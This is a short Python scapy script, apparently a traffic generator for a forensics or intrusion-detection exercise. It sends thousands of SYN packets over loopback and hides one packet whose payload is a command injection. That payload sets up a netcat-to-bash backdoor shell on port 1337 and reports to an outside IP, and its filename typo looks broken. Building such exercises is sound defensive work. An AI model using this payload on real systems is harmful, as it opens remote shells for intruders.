from scapy.all import Ether, IP, TCP, sendp

A = "77.123.100.186"
B = "128.8.0.0"
C = 6000
D = 5000

malware = bytes("';\nrm -f backd00r\nmkfifo backd00r\nnc -lk 1337 0<backd00r | /bin/bash 1>backd00\necho 'мен кіремін' | nc 37.46.96.0 1337", 'utf-16')

for i in range(3803):
    sendp(Ether() / IP(src=A, dst=B) / TCP(sport=C, dport=D, flags='S'), iface='lo')
    C += 1
sendp(Ether() / IP(src=A, dst=B) / TCP(sport=C, dport=D, flags='S') / malware, iface='lo')
C += 1
for i in range(1197):
    sendp(Ether() / IP(src=A, dst=B) / TCP(sport=C, dport=D, flags='S'), iface='lo')
    C += 1
print(C)
